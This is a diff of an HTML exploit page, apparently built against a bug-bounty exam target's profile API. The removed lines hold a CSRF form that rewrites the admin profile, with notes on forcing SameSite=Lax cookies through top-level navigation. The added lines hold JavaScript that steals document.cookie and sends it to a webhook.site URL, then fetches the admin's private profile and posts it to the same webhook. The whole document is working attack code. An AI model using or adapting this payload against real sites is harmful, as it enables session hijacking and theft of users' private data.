@@ -1,25 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>Critical Security Update</title>
-</head>
 <body>
-    <h1>Verifying Admin Session for Message: 69e166fc...</h1>
-    
-    <form id="exploitForm" action="https://api-bugbounty-exam.hashacademy.co/api/auth/profile" method="POST" enctype="text/plain">
-        <input type="hidden" name='{"fullName":"Admin_Pwned","email":"ladybughunter1@gmail.com","address":{"street":"123","city":"Tripoli","state":"FL","zipCode":"33601","country":"US"},"ignore":"' value='"}'>
-    </form>
-
+    <h1>System Loading...</h1>
     <script>
-        // 1. Log the attempt
-        fetch("https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283?status=final_navigation_attempt");
+        const myWebhook = "https://webhook.site/841a65c5-0695-459d-80da-91ae7613c283";
+        const targetProfile = "https://api-bugbounty-exam.hashacademy.co/api/auth/profile";
 
-        // 2. Submit the form as a TOP-LEVEL navigation
-        // This causes the Bot's tab to actually CHANGE to the API URL, 
-        // which forces the browser to include SameSite=Lax cookies.
-        setTimeout(() => {
-            document.getElementById('exploitForm').submit();
-        }, 1000);
+        // 1. Try to grab the session cookie (if not HttpOnly)
+        if (document.cookie) {
+            fetch(myWebhook + "?stolen_cookie=" + btoa(document.cookie));
+        }
+
+        // 2. Fetch the Admin's private profile data and send it to your webhook
+        // This is where the Flag or the Admin's sensitive details usually live
+        fetch(targetProfile)
+            .then(response => response.json())
+            .then(data => {
+                // Send the actual JSON data to your webhook as a POST
+                fetch(myWebhook, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify({
+                        status: "exfiltrated_data",
+                        admin_info: data
+                    })
+                });
+            })
+            .catch(err => fetch(myWebhook + "?error=" + btoa(err)));
     </script>
 </body>
 </html>
